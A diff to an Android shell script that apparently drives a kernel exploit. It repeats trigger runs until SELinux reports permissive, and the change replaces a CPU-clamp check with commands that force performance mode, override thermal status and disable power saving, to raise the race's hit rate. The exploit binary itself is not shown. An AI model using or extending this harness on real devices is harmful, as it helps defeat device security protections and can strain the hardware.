@@ -21,37 +21,29 @@ am kill-all 2>&1 | tail -1 >> $LOG
 
 getfield() { grep -o "$1=[0-9a-f]*" $STATUS 2>/dev/null | cut -d= -f2 | head -1; }
 
-# logenv: 每轮触发前记环境 (裁"热窗假说": 灭是否伴随低频/高温, 见 LIVENESS_VERDICT)
+# logenv: 每轮触发前记环境 (裁 热窗/省电/hotplug 假说, 见 FREQ_DIAGNOSIS §二/§四)
 logenv() {
+  BL=$(dumpsys battery 2>/dev/null | grep -m1 -i 'level' | grep -o '[0-9]*')
   echo "env[$(date +%H:%M:%S)] load=$(cat /proc/loadavg 2>/dev/null) \
+batt=${BL:-NA} lowpower=$(settings get global low_power 2>/dev/null) \
 freq0=$(cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_cur_freq 2>/dev/null) \
 freq1=$(cat /sys/devices/system/cpu/cpu1/cpufreq/scaling_cur_freq 2>/dev/null) \
+on1=$(cat /sys/devices/system/cpu/cpu1/online 2>/dev/null || echo NA) \
+on2=$(cat /sys/devices/system/cpu/cpu2/online 2>/dev/null || echo NA) \
 thermal=$(cat /sys/class/thermal/thermal_zone0/temp 2>/dev/null)" >> $LOG
 }
 
-# freqgate: joyose clamp 检测 (THERMAL_RESPONSE). 盯 scaling_max_freq 而非 cur:
-#   clamp = max 被压低 (负载也上不去); 空载 cur 低是正常调频无害.
-#   clamp → 自动 force-stop joyose → 复查 → 仍 clamp 则跳过本轮 (返回 1)
-FREQ_MIN=1500000
-isnum() { case "$1" in ''|*[!0-9]*) return 1;; esac; return 0; }
-readmax() { cat /sys/devices/system/cpu/$1/cpufreq/scaling_max_freq 2>/dev/null; }
+# freqgate v2 (FREQ_DIAGNOSIS §五): 不再闸门/跳轮 (16:02 实证 clamp 在 round
+# 起跑 3s 后落下, 轮前闸门护不住轮中). 改为: 每轮重发 framework 保频 (幂等,
+# shell 持 DEVICE_POWER, 重启即逆) + cur 配对采样记录. 任何路径必留一行日志
+# (v1 零输出的教训). scaling_max_freq 是 system:system 组文件读不到, 弃用.
 freqgate() {
-  m0=$(readmax cpu0); m1=$(readmax cpu1)
-  if ! { isnum "$m0" && isnum "$m1"; }; then
-    echo "freqgate: max_freq unreadable (m0=$m0 m1=$m1) - proceed unguarded" >> $LOG
-    return 0
-  fi
-  if [ "$m0" -lt "$FREQ_MIN" ] || [ "$m1" -lt "$FREQ_MIN" ]; then
-    echo "freqgate: CLAMP m0=$m0 m1=$m1 -> force-stop com.xiaomi.joyose" >> $LOG
-    am force-stop com.xiaomi.joyose 2>/dev/null
-    sleep 2
-    m0=$(readmax cpu0); m1=$(readmax cpu1)
-    if [ "$m0" -lt "$FREQ_MIN" ] || [ "$m1" -lt "$FREQ_MIN" ]; then
-      echo "freqgate: STILL clamped m0=$m0 m1=$m1 - SKIP this round" >> $LOG
-      return 1
-    fi
-    echo "freqgate: recovered m0=$m0 m1=$m1" >> $LOG
-  fi
+  cmd power set-fixed-performance-mode-enabled true >/dev/null 2>&1
+  cmd thermalservice override-status 0 >/dev/null 2>&1
+  cmd power set-adaptive-power-saver-enabled false >/dev/null 2>&1
+  c0=$(cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_cur_freq 2>/dev/null)
+  c1=$(cat /sys/devices/system/cpu/cpu1/cpufreq/scaling_cur_freq 2>/dev/null)
+  echo "freqgate[$(date +%H:%M:%S)] post-perflock cur0=$c0 cur1=$c1" >> $LOG
   return 0
 }
 
@@ -65,7 +57,7 @@ if [ "$SKIP_R0" = "1" ]; then
 else
 for R0N in 1 2 3; do
   logenv
-  freqgate || continue
+  freqgate
   rm -f $RUNLOG
   timeout 120 env \
     PSELECT_SLIDE_TRIGGER=1 \
@@ -91,7 +83,7 @@ for E in 1 2 3; do
   EF=$(getenforce 2>/dev/null)
   case "$EF" in *ermissive*) break;; esac
   logenv
-  freqgate || continue
+  freqgate
   rm -f $RUNLOG
   timeout 120 env \
     PSELECT_SLIDE_TRIGGER=1 \
@@ -115,7 +107,7 @@ KOARG=""
 # 单发命中 ~20-40% → 4 轮累计 59-87%; 每轮独立进程, 不破一进程一写
 for RA in 1 2 3 4; do
   logenv
-  freqgate || continue
+  freqgate
   rm -f $RUNLOG
   TASKARG=""
   [ $RA -gt 1 ] && TASKARG="PSELECT_TASK=$(getfield task)"
@@ -155,7 +147,7 @@ TASK=$(getfield task)
 echo "STAGE-C task=$TASK" >> $LOG
 for CA in 1 2 3 4; do
   logenv
-  freqgate || continue
+  freqgate
   rm -f $RUNLOG
   timeout 120 env \
     PSELECT_SLIDE_TRIGGER=1 \
